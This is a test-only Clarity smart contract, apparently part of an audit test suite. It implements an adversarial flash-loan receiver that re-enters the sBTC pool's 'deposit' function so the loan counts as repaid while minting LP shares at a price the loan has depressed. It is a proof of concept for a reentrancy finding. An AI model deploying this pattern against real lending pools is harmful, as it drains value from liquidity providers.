;; TEST-ONLY receiver, adversarial: instead of repaying the loan with a plain
;; sBTC transfer, it calls back into flashstack-sbtc-pool-v2's own `deposit`
;; with (amount + fee). That satisfies the pool's balance-delta repayment
;; check (the pool's sBTC balance genuinely grows by >= fee) while ALSO
;; minting the caller LP shares -- priced against the pool's balance as
;; depressed by this same loan's outbound transfer, not the pool's balance
;; before the loan.
;;
;; SIP-010 counterpart of test-pool-v2-receiver-deposit-reentrant.clar
;; (ajv.4.8): independently proves the same F-9 vector reaches
;; flashstack-sbtc-pool-v2, since its repayment path is a SIP-010 `transfer`
;; call (which asserts tx-sender == sender) rather than `stx-transfer?`, and
;; the two pools share no reentrancy surface with each other.
;;
;; The deposit call is wrapped in `as-contract` so `tx-sender` inside
;; `deposit` resolves to THIS contract's own principal, not the original
;; attacker. Without it, `deposit`'s internal sbtc-token transfer call would
;; need `sender` == the attacker's own principal to satisfy its
;; `tx-sender == sender` check, meaning the attacker would have to fund the
;; self-deposit from their own wallet rather than from the loan proceeds
;; this contract is already holding -- defeating the fee-sized-capital
;; framing, same reasoning as the STX PoC's as-contract correction.
(impl-trait .sbtc-flash-receiver-trait.sbtc-flash-receiver-trait)

(define-public (execute-sbtc-flash (amount uint) (core principal))
  (let (
    (fee-bp  (unwrap! (contract-call? .flashstack-sbtc-pool-v2 get-fee-basis-points) (err u901)))
    (raw-fee (/ (* amount fee-bp) u10000))
    (fee     (if (> raw-fee u0) raw-fee u1))
  )
    (unwrap! (as-contract (contract-call? .flashstack-sbtc-pool-v2 deposit (+ amount fee))) (err u902))
    (ok true)
  )
)
